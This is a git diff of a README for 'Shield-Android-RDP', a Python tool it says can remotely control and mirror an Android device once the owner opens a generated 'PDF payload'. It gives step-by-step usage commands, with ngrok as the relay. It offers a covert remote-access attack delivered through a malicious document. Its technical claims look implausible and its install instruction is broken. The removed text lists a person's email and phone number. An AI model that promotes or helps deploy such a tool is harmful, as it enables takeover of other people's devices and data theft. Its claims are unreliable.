@@ -1,61 +1,52 @@
-  
+# Shield-Android-RDP
+
+This is a Python script that can be used to remotely control an Android device using a PDF payload.
+
+## How to use
+
+1. Install the required dependencies:
+    * `ngrok`
+    * `socket`
+    * `struct`
+    * `time`
+    * `numpy`
+    * `adbutils`
+    * `av`
+    * `Shield-Android-RDP`
+0R just type
+"pip3 install requirents.txt"
+
+2. Get the PDF payload for your Android device. You can do this using the following command:
+    ```
+    python Shield.py generate_pdf_payload
+    ```
+
+3. Start ngrok and get the public URL.
+4. Run the following command to start the Shield server:
+    ```
+    python Shield.py start --pdf-payload <PDF_PAYLOAD>
+    
+
+5. On your Android device, open the PDF payload in any PDF viewer.
+6. Once the PDF payload is opened, the Shield server will start mirroring the Android device's screen.
+
+## Git repository
+
+The Git repository for this project is located at:
+
+
+https://github.com/CIPHER0930/Shield-Android-RDP
+
+
+## File to run
+
+The file to run is called `Shield.py`.
+
+## Caution
+
+This script can be used to remotely control an Android device. This could allow an attacker to steal data, install malware, or even take complete control of the device. Use this script with caution and only on devices that you trust.
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-###############################
-
-Shield
-Shield is a remote control application for Android devices. It allows you to control your Android device from your computer using a PDF payload.
-
-Features:
-
-Remote control your Android device from your computer
-Mirror your Android device's screen to your computer
-Send commands to your Android device
-Upload files to your Android device
-Download files from your Android device
-
-Requirements:
-
-Python 3
-Ngrok
-Adbutils
-FFmpeg
-Shield server (JAR file)
-Getting started:
-
-Install the required dependencies.
-Start Ngrok and get your public URL.
-Run the Shield client and pass in your PDF payload.
-Connect to the Shield server using your public URL and port 5555.
-Start the mirroring process.
-Example:
-
-python
-import shield
-
-pdf_payload = b"PDF payload"
-
-client = shield.Shield(pdf_payload)
-client.start()
-
-Reporting the script:
-
-If you believe that your Android device has been infected with this script, you should immediately take steps to remove it. You can do this by running a security scan on your device or by restoring your device to factory settings or better still, contact the Author of this script , Shiled via email(richmondrichmond183@gmail.com) or via phone(+237680425271) .
-
-You should also be careful about what PDF files you open on your Android device. Only open PDF files from trusted sources. If you are unsure whether or not a PDF file is safe, you should not open it.
+###################################
+###################################
